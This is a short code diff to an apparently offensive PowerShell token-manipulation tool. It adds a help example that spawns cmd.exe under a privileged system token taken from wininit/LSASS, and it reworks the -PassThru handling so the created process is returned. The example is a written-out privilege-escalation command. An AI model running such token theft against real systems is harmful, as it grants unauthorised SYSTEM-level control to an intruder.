@@ -156,6 +156,12 @@ Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Ge
 
 .EXAMPLE
 
+(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe").WaitForExit()
+
+Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.
+
+.EXAMPLE
+
 Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser
 
 Makes the current thread impersonate the lsass security token.
@@ -1613,6 +1619,18 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                 $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                 $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
+
+		#Pass created System.Diagnostics.Process object to pipeline
+		if ($PassThru) {
+			#Retrieving created System.Diagnostics.Process object
+			$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId
+
+			#Caching process handle so we don't lose it when the process exits
+			$null = $returnProcess.Handle
+
+			#Passing System.Diagnostics.Process object to pipeline
+			$returnProcess
+		}
             }
             else
             {
@@ -1637,11 +1655,6 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
             }
         }
-
-	#Pass created System.Diagnostics.Process object to pipeline
-	if ($PassThru) {
-		Get-Process -Id $ProcessInfo.dwProcessId
-	}
     }
 
 
